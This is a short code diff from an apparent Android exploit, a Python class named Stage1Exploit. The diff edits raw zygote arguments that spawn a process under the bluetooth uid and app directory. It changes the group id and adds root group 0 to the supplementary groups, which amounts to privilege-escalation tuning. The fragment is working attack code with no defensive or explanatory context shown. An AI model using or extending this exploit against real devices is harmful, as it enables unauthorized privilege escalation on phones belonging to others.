@@ -190,8 +190,8 @@ class Stage1Exploit:
         # TODO let you specify the SELinux context through command line arguments
         raw_zygote_arguments = [
             "--setuid=1002",
-            "--setgid=0",
-            "--setgroups=3003",
+            "--setgid=1000",
+            "--setgroups=3003,0",
             "--target-sdk-version=28",
             "--app-data-dir=/data/user/0/com.android.bluetooth",
             "--runtime-args",
